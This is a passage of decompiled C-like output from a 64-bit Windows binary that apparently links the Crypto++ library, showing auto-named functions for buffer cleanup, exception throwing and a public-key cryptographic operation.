  *((_BYTE *)v3 + 40) = 0;
  if ( *((_QWORD *)v3 + 4) >= 0x10ui64 )
    operator delete(*((void **)v3 + 1));
  *((_QWORD *)v3 + 4) = 15i64;
  *((_QWORD *)v3 + 3) = 0i64;
  *((_BYTE *)v3 + 8) = 0;
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140024CA0) ----------------------------------------------------
void *__fastcall sub_140024CA0(void *a1, char a2)
{
  char v2; // si
  void *v3; // rbx
  void (__fastcall ***v4)(_QWORD, signed __int64); // rcx
  void *v5; // rdx

  v2 = a2;
  v3 = a1;
  sub_140023D40((__int64)a1 + 88);
  v4 = (void (__fastcall ***)(_QWORD, signed __int64))*((_QWORD *)v3 + 10);
  if ( v4 )
    (**v4)(v4, 1i64);
  v5 = (void *)*((_QWORD *)v3 + 7);
  memset(*((void **)v3 + 7), 0, 8i64 * *((_QWORD *)v3 + 6));
  free(v5);
  if ( v2 & 1 )
    operator delete(v3);
  return v3;
}

//----- (0000000140024D20) ----------------------------------------------------
signed __int64 __fastcall sub_140024D20(__int64 a1)
{
  signed __int64 result; // rax

  result = a1 + 8;
  if ( a1 != -8 )
    result = a1 + 16;
  return result;
}

//----- (0000000140024D30) ----------------------------------------------------
__int64 __fastcall sub_140024D30(__int64 a1)
{
  return (*(__int64 (**)(void))(*(_QWORD *)a1 + 120i64))();
}

//----- (0000000140024D40) ----------------------------------------------------
__int64 __fastcall sub_140024D40(__int64 a1)
{
  __int64 result; // rax

  result = (*(__int64 (**)(void))(*(_QWORD *)a1 + 40i64))();
  if ( result )
    result += *(signed int *)(*(_QWORD *)(result + 8) + 4i64) + 8i64;
  return result;
}

//----- (0000000140024D70) ----------------------------------------------------
__int64 __fastcall sub_140024D70(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx
  __int64 v3; // rax

  v2 = a2;
  v3 = (*(__int64 (**)(void))(**(_QWORD **)(a1 + 8) + 120i64))();
  return sub_14003C670(v2, v3);
}

//----- (0000000140024DA0) ----------------------------------------------------
__int64 __fastcall sub_140024DA0(__int64 a1)
{
  return (*(__int64 (**)(void))(**(_QWORD **)(a1 + 8) + 120i64))();
}

//----- (0000000140024DB0) ----------------------------------------------------
char __fastcall sub_140024DB0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, unsigned __int8 a5)
{
  __int64 v5; // r15
  __int64 v6; // rsi
  __int64 v7; // r12
  __int64 v8; // rdi
  __int64 v9; // rbx
  unsigned int v10; // eax
  __int64 v11; // rsi
  __int64 v12; // rax
  unsigned __int8 v13; // ST58_1
  void *v14; // rdx
  void *v15; // rdx
  void *v16; // rdx
  char v18; // [rsp+38h] [rbp-90h]
  __int64 v19; // [rsp+48h] [rbp-80h]
  void *Memory; // [rsp+50h] [rbp-78h]
  char v21; // [rsp+60h] [rbp-68h]
  __int64 v22; // [rsp+70h] [rbp-58h]
  void *v23; // [rsp+78h] [rbp-50h]
  char v24; // [rsp+88h] [rbp-40h]
  __int64 v25; // [rsp+98h] [rbp-30h]
  void *v26; // [rsp+A0h] [rbp-28h]

  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = a1;
  v9 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 120i64))();
  v10 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v8 + 64i64))(v8);
  sub_14003C170(&v24, v6, v10, 0);
  (*(void (__fastcall **)(__int64, char *, __int64, _QWORD))(*(_QWORD *)v9 + 112i64))(v9, &v21, v5, a5);
  v11 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v8 + 112i64))(v8);
  v12 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v8 + 120i64))(v8);
  v13 = a5;
  (*(void (__fastcall **)(__int64, char *, __int64, char *, unsigned __int8, char *, signed __int64))(*(_QWORD *)v11 + 8i64))(
    v11,
    &v18,
    v12,
    &v21,
    v13,
    &v24,
    -2i64);
  (*(void (__fastcall **)(__int64, _QWORD, char *, __int64))(*(_QWORD *)v9 + 104i64))(v9, 0i64, &v18, v7);
  v14 = Memory;
  memset(Memory, 0, 8 * v19);
  free(v14);
  v15 = v23;
  memset(v23, 0, 8 * v22);
  free(v15);
  v16 = v26;
  memset(v26, 0, 8 * v25);
  free(v16);
  return 1;
}

//----- (0000000140024F00) ----------------------------------------------------
__int64 __fastcall sub_140024F00(__int64 a1, __int64 a2, __int64 a3, __int64 *a4, __int64 a5)
{
  __int64 *v5; // r14
  __int64 v6; // rsi
  __int64 v7; // rbp
  __int64 v8; // rbx
  __int64 v9; // rdi
  __int64 v10; // rax
  void *v11; // rdx
  __int64 v13; // [rsp+30h] [rbp-48h]
  __int64 v14; // [rsp+40h] [rbp-38h]
  void *Memory; // [rsp+48h] [rbp-30h]

  v5 = a4;
  v6 = a3;
  v7 = a2;
  v8 = sub_14003C000((__int64)&v13, a5);
  v9 = *v5;
  v10 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v6 + 40i64))(v6);
  (*(void (__fastcall **)(__int64 *, __int64, __int64, __int64))(v9 + 48))(v5, v7, v10, v8);
  v11 = Memory;
  memset(Memory, 0, 8 * v14);
  free(v11);
  return v7;
}

//----- (0000000140025190) ----------------------------------------------------
__int64 __fastcall sub_140025190(__int64 a1)
{
  __int64 v1; // rax

  v1 = (*(__int64 (**)(void))(*(_QWORD *)a1 + 120i64))();
  return (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v1 + 96i64))(v1, 0i64);
}

//----- (00000001400251B0) ----------------------------------------------------
_QWORD *__fastcall sub_1400251B0(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx

  v2 = a2;
  sub_140029050(a2);
  return v2;
}

//----- (00000001400251E0) ----------------------------------------------------
_QWORD *__fastcall sub_1400251E0(__int64 a1, _QWORD *a2)
{
  _QWORD *v2; // rbx

  a2[3] = 15i64;
  v2 = a2;
  a2[2] = 0i64;
  *(_BYTE *)a2 = 0;
  sub_140004F20(a2, "unknown", 7ui64);
  return v2;
}

//----- (000000014002521C) ----------------------------------------------------
__int64 __fastcall sub_14002521C(__int64 a1, __int64 a2)
{
  return sub_140025230(a1 - *(signed int *)(a1 - 4), a2);
}

//----- (0000000140025230) ----------------------------------------------------
__int64 __fastcall sub_140025230(__int64 a1, __int64 a2)
{
  signed __int64 v2; // rdi
  __int64 v3; // rbx
  __int64 result; // rax

  v2 = a1 - 216;
  v3 = a2;
  result = sub_140022AD0(a2, a1 - 216);
  if ( !(_BYTE)result )
  {
    result = type_info::operator!=(
               &CryptoPP::cls_113 `RTTI Type Descriptor',
               &CryptoPP::cls_111<CryptoPP::ModExpPrecomputation,CryptoPP::cls_112<CryptoPP::cls_097>> `RTTI Type Descriptor');
    if ( (_BYTE)result )
      result = (__int64)sub_140055260(v2 + 80, v3);
  }
  return result;
}
// 1400A1920: using guessed type __int64 __fastcall type_info::operator!=(_QWORD, _QWORD);
// 1400D8D90: using guessed type void *(__fastcall **CryptoPP::cls_111<CryptoPP::ModExpPrecomputation,CryptoPP::cls_112<CryptoPP::cls_097>> `RTTI Type Descriptor')(type_info *this, unsigned int);

//----- (0000000140025284) ----------------------------------------------------
signed __int64 *__fastcall sub_140025284(__int64 a1, __int64 a2)
{
  return sub_140055260(a1 - *(signed int *)(a1 - 4) - 136, a2);
}

//----- (00000001400252A0) ----------------------------------------------------
__int64 __fastcall sub_1400252A0(__int64 a1, void *a2, __int64 a3, _DWORD *a4)
{
  _DWORD *v4; // rbx
  __int64 v5; // rdi
  void *v6; // rbp
  __int64 v7; // rsi
  __int64 result; // rax

  v4 = a4;
  v5 = a3;
  v6 = a2;
  v7 = a1;
  if ( !qword_1400DAB40
    || !(unsigned __int8)type_info::operator==(&int `RTTI Type Descriptor', &int `RTTI Type Descriptor')
    || (result = qword_1400DAB40(v5, v4, v7 + 32), !(_BYTE)result) )
  {
    sub_1400293A0(v6, (__int64)&int `RTTI Type Descriptor', v5);
    result = *(unsigned int *)(v7 + 32);
    *v4 = result;
  }
  return result;
}
// 1400DAB40: invalid function type has been ignored
// 1400A1928: using guessed type __int64 __fastcall type_info::operator==(_QWORD, _QWORD);
// 1400D8D00: using guessed type int int `RTTI Type Descriptor';
// 1400DAB40: using guessed type __int64 (__fastcall *qword_1400DAB40)(_QWORD, _QWORD, _QWORD);

//----- (0000000140025330) ----------------------------------------------------
__int64 __fastcall sub_140025330(__int64 a1)
{
  __int64 v1; // rdi
  _QWORD *v2; // rbx
  char *v3; // rax
  size_t v4; // r8
  _QWORD *v5; // rax
  _QWORD *v6; // rbx
  size_t v7; // r8
  unsigned __int64 v8; // rsi
  unsigned __int64 v9; // rax
  _QWORD *v10; // rax
  bool v11; // cf
  unsigned __int8 *v12; // rbx
  const char *v13; // rax
  unsigned __int8 *v14; // r8
  signed __int64 v15; // rax
  int v16; // er9
  int v17; // er10

  v1 = a1;
  if ( !*(_BYTE *)(a1 + 33) )
    goto LABEL_22;
  v2 = sub_140004CA0(*(void **)(a1 + 24), "ThisObject:", 0xBui64);
  v3 = (char *)type_info::_name_internal_method(
                 (type_info *)&CryptoPP::cls_114 `RTTI Type Descriptor',
                 (struct __type_info_node *)&unk_1400DC648);
  if ( *v3 )
  {
    v4 = -1i64;
    do
      ++v4;
    while ( v3[v4] );
  }
  else
  {
    v4 = 0i64;
  }
  v5 = sub_140004CA0(v2, v3, v4);
  v6 = v5;
  v7 = v5[2];
  if ( -1i64 - v7 <= 1 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  v8 = v7 + 1;
  if ( v7 + 1 > 0xFFFFFFFFFFFFFFFEui64 )
  {
    std::_Xlength_error("string too long");
    __debugbreak();
  }
  v9 = v5[3];
  if ( v9 < v8 )
  {
    sub_140004790(v6, v8, v7);
    if ( !v8 )
      goto LABEL_22;
    goto LABEL_12;
  }
  if ( v8 )
  {
LABEL_12:
    if ( v6[3] < 0x10ui64 )
      v10 = v6;
    else
      v10 = (_QWORD *)*v6;
    *((_BYTE *)v10 + v6[2]) = 59;
    v11 = v6[3] < 0x10ui64;
    v6[2] = v8;
    if ( !v11 )
      v6 = (_QWORD *)*v6;
    *((_BYTE *)v6 + v8) = 0;
    goto LABEL_22;
  }
  v6[2] = 0i64;
  if ( v9 >= 0x10 )
    v6 = (_QWORD *)*v6;
  *(_BYTE *)v6 = 0;
LABEL_22:
  if ( !*(_BYTE *)(v1 + 32) && !strncmp(*(const char **)(v1 + 8), "ThisObject:", 0xBui64) )
  {
    v12 = *(unsigned __int8 **)(v1 + 8);
    v13 = type_info::_name_internal_method(
            (type_info *)&CryptoPP::cls_114 `RTTI Type Descriptor',
            (struct __type_info_node *)&unk_1400DC648);
    v14 = v12 + 11;
    v15 = v13 - (const char *)(v12 + 11);
    do
    {
      v16 = v14[v15];
      v17 = *v14 - v16;
      if ( *v14 != v16 )
        break;
      ++v14;
    }
    while ( v16 );
    if ( !v17 )
    {
      sub_1400293A0(v12, (__int64)&CryptoPP::cls_114 `RTTI Type Descriptor', *(_QWORD *)(v1 + 16));
      sub_140024360(*(_QWORD *)(v1 + 24), *(_QWORD *)v1);
      *(_BYTE *)(v1 + 32) = 1;
    }
  }
  return v1;
}
// 1400A1770: using guessed type void __stdcall std::_Xlength_error(const char *);
// 1400A17B8: using guessed type const char *type_info::_name_internal_method(type_info *__hidden this, struct __type_info_node *);

//----- (00000001400254E0) ----------------------------------------------------
_QWORD *__fastcall sub_1400254E0(__int64 a1, _QWORD *a2, __int64 a3)
{
  _QWORD *v3; // rbx

  v3 = a2;
  sub_14003BFA0(a2, a3);
  return v3;
}

//----- (0000000140025510) ----------------------------------------------------
__int64 __fastcall sub_140025510(__int64 a1)
{
  return (*(__int64 (**)(void))(*(_QWORD *)a1 + 16i64))();
}

//----- (0000000140025520) ----------------------------------------------------
__int64 __fastcall sub_140025520(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6)
{
  __int64 v6; // rbx

  v6 = a2;
  sub_14004E9B0(a1, a2, a3, a4, a5, a6);
  return v6;
}

//----- (0000000140025560) ----------------------------------------------------
__int64 __fastcall sub_140025560(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx

  v3 = a2;
  (*(void (__cdecl **)(_QWORD, __int64, __int64))(**(_QWORD **)(a1 + 8) + 160i64))(*(_QWORD *)(a1 + 8), a2, a3);
  return v3;
}

//----- (00000001400255A0) ----------------------------------------------------
void __fastcall sub_1400255A0(unsigned __int64 a1)
{
  char v1; // [rsp+28h] [rbp-80h]
  __int64 v2; // [rsp+38h] [rbp-70h]
  __int64 v3; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v4)(void *); // [rsp+50h] [rbp-58h]
  int v5; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v7; // [rsp+80h] [rbp-28h]
  __int64 v8; // [rsp+88h] [rbp-20h]

  if ( a1 > 0xFFFFFFFFFFFFFFFFui64 )
  {
    v3 = 15i64;
    v2 = 0i64;
    v1 = 0;
    sub_140004F20(&v1, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v4);
    v4 = &off_1400A8798;
    v5 = 1;
    v8 = 15i64;
    v7 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v1, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v4 = &off_1400A8798;
    CxxThrowException(&v4, &_TI3_AVcls_001_CryptoPP__);
  }
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (0000000140025670) ----------------------------------------------------
signed __int64 __fastcall sub_140025670(unsigned __int64 a1)
{
  signed __int64 result; // rax
  char v2; // [rsp+28h] [rbp-80h]
  __int64 v3; // [rsp+38h] [rbp-70h]
  __int64 v4; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v5)(void *); // [rsp+50h] [rbp-58h]
  int v6; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v8; // [rsp+80h] [rbp-28h]
  __int64 v9; // [rsp+88h] [rbp-20h]

  result = 0x1FFFFFFFFFFFFFFFi64;
  if ( a1 > 0x1FFFFFFFFFFFFFFFi64 )
  {
    v4 = 15i64;
    v3 = 0i64;
    v2 = 0;
    sub_140004F20(&v2, byte_1400A3400, 0i64);
    std::exception::exception((std::exception *)&v5);
    v5 = &off_1400A8798;
    v6 = 1;
    v9 = 15i64;
    v8 = 0i64;
    Dst = 0;
    sub_140004DF0(&Dst, &v2, 0i64, 0xFFFFFFFFFFFFFFFFui64);
    v5 = &off_1400A8798;
    CxxThrowException(&v5, &_TI3_AVcls_001_CryptoPP__);
  }
  return result;
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B30: using guessed type int _TI3_AVcls_001_CryptoPP__;

//----- (0000000140025760) ----------------------------------------------------
_QWORD *__fastcall sub_140025760(__int64 a1)
{
  __int64 v1; // rbx
  _QWORD *v2; // rax
  _QWORD *result; // rax

  v1 = a1;
  v2 = operator new(0x90ui64);
  if ( v2 )
    result = sub_1400233A0(v2, v1);
  else
    result = 0i64;
  return result;
}

//----- (00000001400257A0) ----------------------------------------------------
_QWORD *__fastcall sub_1400257A0(__int64 a1)
{
  __int64 v1; // rbx
  _QWORD *v2; // rax
  _QWORD *result; // rax

  v1 = a1;
  v2 = operator new(0xD0ui64);
  if ( v2 )
    result = sub_140023480(v2, v1);
  else
    result = 0i64;
  return result;
}

//----- (00000001400257E0) ----------------------------------------------------
void __noreturn sub_1400257E0()
{
  char v0; // [rsp+28h] [rbp-80h]
  __int64 v1; // [rsp+38h] [rbp-70h]
  __int64 v2; // [rsp+40h] [rbp-68h]
  __int64 (__fastcall **v3)(void *); // [rsp+50h] [rbp-58h]
  int v4; // [rsp+68h] [rbp-40h]
  char Dst; // [rsp+70h] [rbp-38h]
  __int64 v6; // [rsp+80h] [rbp-28h]
  __int64 v7; // [rsp+88h] [rbp-20h]

  v2 = 15i64;
  v1 = 0i64;
  v0 = 0;
  sub_140004F20(&v0, byte_1400A3400, 0i64);
  std::exception::exception((std::exception *)&v3);
  v3 = &off_1400A8798;
  v4 = 0;
  v7 = 15i64;
  v6 = 0i64;
  Dst = 0;
  sub_140004DF0(&Dst, &v0, 0i64, 0xFFFFFFFFFFFFFFFFui64);
  v3 = &off_1400A8798;
  CxxThrowException(&v3, &_TI3_AVcls_004_CryptoPP__);
}
// 1400862C8: using guessed type __int64 __fastcall CxxThrowException(_QWORD, _QWORD);
// 1400A1930: using guessed type _QWORD std::exception::exception(std::exception *__hidden this);
// 1400A8798: using guessed type __int64 (__fastcall *off_1400A8798)(void *);
// 1400D3B70: using guessed type int _TI3_AVcls_004_CryptoPP__;

//----- (00000001400258A0) ----------------------------------------------------
__int64 __fastcall sub_1400258A0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rdi
  __int64 v4; // rbx
  int v5; // eax
  int v6; // edx
  void *v7; // rdx
  char v9; // [rsp+30h] [rbp-38h]
  __int64 v10; // [rsp+40h] [rbp-28h]
  void *Memory; // [rsp+48h] [rbp-20h]

  v3 = a3;
  v4 = a2;
  v5 = (*(__int64 (__cdecl **)(__int64, __int64))(*(_QWORD *)a1 + 48i64))(a1, a2);
  v6 = -1;
  if ( v5 == 1 )
    v6 = 1;
  sub_14003C0E0((__int64)&v9, v6);
  sub_140024710(v4, v3, (__int64)&v9);
  v7 = Memory;
  memset(Memory, 0, 8 * v10);
  free(v7);
  return v4;
}

//----- (0000000140025930) ----------------------------------------------------
__int64 __fastcall sub_140025930(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx

  v2 = a2;
  (*(void (__cdecl **)(_QWORD))(**(_QWORD **)(a1 + 8) + 200i64))(*(_QWORD *)(a1 + 8));
  return v2;
}

//----- (0000000140025960) ----------------------------------------------------
__int64 __fastcall sub_140025960(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx

  v3 = a2;
  sub_1400247D0(a2, a3);
  return v3;
}

//----- (0000000140025990) ----------------------------------------------------
__int64 __fastcall sub_140025990(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rax
  void *v5; // rdx
  char v7; // [rsp+30h] [rbp-38h]
  __int64 v8; // [rsp+40h] [rbp-28h]
  void *Memory; // [rsp+48h] [rbp-20h]

  v3 = a2;
  v4 = sub_140024640(a3, (__int64)&v7, *(_QWORD *)(a1 + 40) << 6);
  sub_1400247D0(v3, v4);
  v5 = Memory;
  memset(Memory, 0, 8 * v8);
  free(v5);
  return v3;
}

//----- (0000000140025A10) ----------------------------------------------------
__int64 __fastcall sub_140025A10(__int64 a1, __int64 a2)
{
  __int64 v2; // rbx

  v2 = a2;
  (*(void (__cdecl **)(_QWORD))(**(_QWORD **)(a1 + 8) + 208i64))(*(_QWORD *)(a1 + 8));
  return v2;
}

//----- (0000000140025A40) ----------------------------------------------------
__int64 __fastcall sub_140025A40(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx

  v3 = a2;
  sub_14003C000(a2, a3);
  return v3;
}

//----- (0000000140025A70) ----------------------------------------------------
__int64 __fastcall sub_140025A70(__int64 a1, __int64 a2, __int64 a3)
{
  return (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a3 + 16i64))(a3);
}

//----- (0000000140025A80) ----------------------------------------------------
__int64 __fastcall sub_140025A80(__int64 a1)
{
  __int64 v1; // rbx
  __int64 result; // rax
  __int64 v3; // rcx

  v1 = a1;
  result = (*(__int64 (**)(void))(*(_QWORD *)(a1 + 144) + 16i64))();
  v3 = *(_QWORD *)(v1 + 8);
  if ( v3 )
    result = (*(__int64 (**)(void))(*(_QWORD *)v3 + 32i64))();
  return result;
}

//----- (0000000140025AC0) ----------------------------------------------------
__int64 __fastcall sub_140025AC0(__int64 *a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rbx
  __int64 v4; // rdi
  __int64 *v5; // rsi
  __int64 v6; // rax

  v3 = *a1;
  v4 = a2;
  v5 = a1;
  v6 = (*(__int64 (__fastcall **)(__int64 *, __int64))(*a1 + 128))(a1, a3);
  return (*(__int64 (__fastcall **)(__int64 *, __int64, __int64))(v3 + 120))(v5, v4, v6);
}

//----- (0000000140025B00) ----------------------------------------------------
__int64 __fastcall sub_140025B00(__int64 a1, __int64 a2)
{
  return (*(__int64 (__fastcall **)(__int64, __int64, __int64))(*(_QWORD *)a1 + 24i64))(a1, a2, a2);
}

//----- (0000000140025B10) ----------------------------------------------------
__int64 __fastcall sub_140025B10(__int64 a1)
{
  return (*(__int64 (**)(void))(**(_QWORD **)(a1 + 8) + 136i64))();
}

//----- (0000000140025B20) ----------------------------------------------------
__int64 __fastcall sub_140025B20(__int64 a1, __int64 a2, __int64 a3, __int64 a4)
{
  __int64 v4; // rbx
  __int64 v5; // rdi
  __int64 v6; // rax
  unsigned int v7; // eax

  v4 = a4;
  v5 = a3;
  v6 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)(a1 - 8) + 32i64))(a1 - 8);
  v7 = sub_1400453C0(v6);
  return sub_140047070(v5, v4, v7, 0);
}

//----- (0000000140025B60) ----------------------------------------------------
bool __fastcall sub_140025B60(__int64 a1, __int64 a2, __int64 a3)
{
  return (unsigned int)sub_140045A60(a2, a3) == 0;
}

//----- (0000000140025D40) ----------------------------------------------------
_QWORD *__fastcall sub_140025D40(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5)
{
  __int64 v5; // r15
  _QWORD *v6; // rbx
  __int64 v7; // rdi
  void *v8; // r13
  __int64 v9; // rax
  __int64 v10; // rax
  rsize_t v11; // r14
  const void *v12; // rdi
  void *v13; // rsi
  __int64 v14; // rax
  void *v15; // rax
  void *v16; // rdx
  void *v17; // rdx
  __int64 v18; // rax
  __int64 v19; // rax
  unsigned int v20; // eax
  size_t v21; // rdi
  void *v22; // r12
  __int64 v23; // rax
  __int64 v24; // rdx
  unsigned int v25; // eax
  __int64 v26; // rdi
  __int64 v27; // rax
  unsigned int v28; // eax
  __int64 v29; // rdi
  __int64 v30; // rax
  unsigned int v31; // eax
  unsigned __int64 v32; // rcx
  void *v33; // rdx
  void *v34; // rdx
  void *v35; // rdx
  size_t Size; // [rsp+50h] [rbp-B0h]
  __int64 (__fastcall **v38)(void *); // [rsp+60h] [rbp-A0h]
  __int64 (__fastcall **v39)(void *); // [rsp+68h] [rbp-98h]
  void **v40; // [rsp+70h] [rbp-90h]
  signed int *v41; // [rsp+78h] [rbp-88h]
  int v42; // [rsp+80h] [rbp-80h]
  char v43; // [rsp+88h] [rbp-78h]
  __int64 v44; // [rsp+98h] [rbp-68h]
  void *v45; // [rsp+A0h] [rbp-60h]
  void (__fastcall ***v46)(_QWORD, signed __int64); // [rsp+B8h] [rbp-48h]
  char v47; // [rsp+C0h] [rbp-40h]
  char v48; // [rsp+150h] [rbp+50h]
  __int64 v49; // [rsp+160h] [rbp+60h]
  void *v50; // [rsp+168h] [rbp+68h]
  unsigned __int64 v51; // [rsp+180h] [rbp+80h]
  void *v52; // [rsp+188h] [rbp+88h]
  unsigned __int64 v53; // [rsp+198h] [rbp+98h]
  __int64 v54; // [rsp+1A0h] [rbp+A0h]
  char v55; // [rsp+1A8h] [rbp+A8h]
  __int64 v56; // [rsp+1B8h] [rbp+B8h]
  void *v57; // [rsp+1C0h] [rbp+C0h]
  __int64 v58; // [rsp+1D0h] [rbp+D0h]
  __int64 v59; // [rsp+1D8h] [rbp+D8h]
  rsize_t v60; // [rsp+1E8h] [rbp+E8h]
  void *v61; // [rsp+1F0h] [rbp+F0h]
  char v62; // [rsp+1F8h] [rbp+F8h]
  __int64 v63; // [rsp+208h] [rbp+108h]
  void *Memory; // [rsp+210h] [rbp+110h]
  char v65; // [rsp+220h] [rbp+120h]
  __int64 v66; // [rsp+230h] [rbp+130h]
  void *v67; // [rsp+238h] [rbp+138h]
  void *Dst; // [rsp+248h] [rbp+148h]
  __int64 v69; // [rsp+258h] [rbp+158h]
  unsigned __int64 v70; // [rsp+260h] [rbp+160h]
  void *Src; // [rsp+268h] [rbp+168h]
  rsize_t DstSize; // [rsp+278h] [rbp+178h]
  unsigned __int64 v73; // [rsp+280h] [rbp+180h]
  __int64 v74; // [rsp+288h] [rbp+188h]
  __int64 v75; // [rsp+298h] [rbp+198h]
  unsigned __int64 v76; // [rsp+2A0h] [rbp+1A0h]
  void *v77; // [rsp+2A8h] [rbp+1A8h]
  __int64 v78; // [rsp+2B8h] [rbp+1B8h]
  unsigned __int64 v79; // [rsp+2C0h] [rbp+1C0h]

  v58 = -2i64;
  v5 = a4;
  v6 = (_QWORD *)a2;
  v7 = a1;
  v59 = a2;
  v8 = 0i64;
  v9 = (*(__int64 (__fastcall **)(__int64, void **))(*(_QWORD *)a4 + 16i64))(a4, &v77);
  sub_140029100(v7, &v48, v9);
  if ( v79 >= 0x10 )
    operator delete(v77);
  v79 = 15i64;
  v78 = 0i64;
  LOBYTE(v77) = 0;
  v10 = (*(__int64 (__fastcall **)(__int64, void **))(*(_QWORD *)v5 + 16i64))(v5, &Dst);
  sub_140029100(v7, &v55, v10);
  if ( v70 >= 0x10 )
    operator delete(Dst);
  v70 = 15i64;
  v69 = 0i64;
  LOBYTE(Dst) = 0;
  (*(void (__fastcall **)(__int64, void **))(*(_QWORD *)v5 + 16i64))(v5, &Src);
  v11 = DstSize;
  v12 = &Src;
  if ( v73 >= 0x10 )
    v12 = Src;
  v60 = DstSize;
  sub_1400255A0(DstSize);
  if ( v11 )
    v13 = sub_14003A000(v11);
  else
    v13 = 0i64;
  v61 = v13;
  if ( v12 && v13 )
  {
    memcpy_s(v13, v11, v12, v11);
  }
  else if ( v11 )
  {
    memset(v13, 0, v11);
  }
  sub_140036DA0((__int64)&v38, 1);
  v38 = &off_1400A6B18;
  v41 = (signed int *)&unk_1400A6B10;
  sub_140022DC0((__int64)&v39, 0);
  v39 = &off_1400A6938;
  v40 = &off_1400A6978;
  *(signed int **)((char *)&v41 + v41[1]) = (signed int *)off_1400A6A20;
  *(_DWORD *)((char *)&v40 + v41[1] + 4) = 0;
  v39 = &off_1400A6A78;
  v40 = &off_1400A6978;
  *(signed int **)((char *)&v41 + v41[1]) = (signed int *)off_1400A6AB8;
  *(_DWORD *)((char *)&v40 + v41[1] + 4) = 0;
  ((void (__fastcall *)(__int64 (__fastcall ***)(void *), char *, char *))v39[5])(&v39, &v48, &v55);
  v14 = sub_1400258A0((__int64)&v39, (__int64)&v65, (__int64)&v48);
  v15 = sub_1400247A0(&v62, v14, 2ui64);
  sub_14003C670((__int64)&v43, (__int64)v15);
  v42 = 0;
  v16 = Memory;
  memset(Memory, 0, 8 * v63);
  free(v16);
  v17 = v67;
  memset(v67, 0, 8 * v66);
  free(v17);
  v18 = v38[15](&v38);
  v19 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)v18 + 64i64))(v18);
  v20 = sub_1400453C0(v19);
  v21 = v20;
  v51 = v20;
  sub_1400255A0(v20);
  if ( v21 )
    v22 = sub_14003A000(v21);
  else
    v22 = 0i64;
  v52 = v22;
  v23 = v38[15](&v38);
  LOBYTE(v24) = 1;
  v25 = (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)v23 + 96i64))(v23, v24);
  v26 = v25;
  Size = v25;
  sub_1400255A0(v25);
  if ( v26 )
    v8 = sub_14003A000((unsigned int)v26);
  v27 = v38[15](&v38);
  v28 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v27 + 96i64))(v27, 0i64);
  v29 = v28;
  v53 = v28;
  sub_1400255A0(v28);
  if ( v29 )
    v29 = (__int64)sub_14003A000(v29);
  v54 = v29;
  sub_140037EB0((__int64)&v38, a5, (__int64)v22, (__int64)v8);
  if ( sub_140024DB0((__int64)&v38, v29, (__int64)v22, (__int64)v13, 1u) )
  {
    v70 = 15i64;
    v69 = 0i64;
    LOBYTE(Dst) = 0;
    sub_140004F20(&Dst, v8, Size);
    (*(void (__fastcall **)(__int64, void **))(*(_QWORD *)v5 + 8i64))(v5, &Dst);
    v30 = v38[15](&v38);
    v31 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)v30 + 96i64))(v30, 0i64);
    v76 = 15i64;
    v75 = 0i64;
    LOBYTE(v74) = 0;
    sub_140004F20(&v74, (void *)v29, v31);
    v6[3] = 15i64;
    v6[2] = 0i64;
    *(_BYTE *)v6 = 0;
    v32 = v76;
    if ( v76 >= 0x10 )
    {
      *v6 = v74;
      v74 = 0i64;
    }
    else if ( v75 != -1 )
    {
      memmove(v6, &v74, v75 + 1);
      v32 = v76;
    }
    v6[2] = v75;
    v6[3] = v32;
    v76 = 15i64;
    v75 = 0i64;
    LOBYTE(v74) = 0;
    if ( v70 >= 0x10 )
      operator delete(Dst);
    v70 = 15i64;
    v69 = 0i64;
    LOBYTE(Dst) = 0;
    memset((void *)v29, 0, v53);
    free((void *)v29);
    memset(v8, 0, Size);
    free(v8);
    memset(v22, 0, v51);
    free(v22);
    sub_140023D40((__int64)&v47);
    if ( v46 )
      (**v46)(v46, 1i64);
  }
  else
  {
    v6[3] = 15i64;
    v6[2] = 0i64;
    *(_BYTE *)v6 = 0;
    sub_140004F20(v6, byte_1400A3400, 0i64);
    memset((void *)v29, 0, v53);
    free((void *)v29);
    memset(v8, 0, Size);
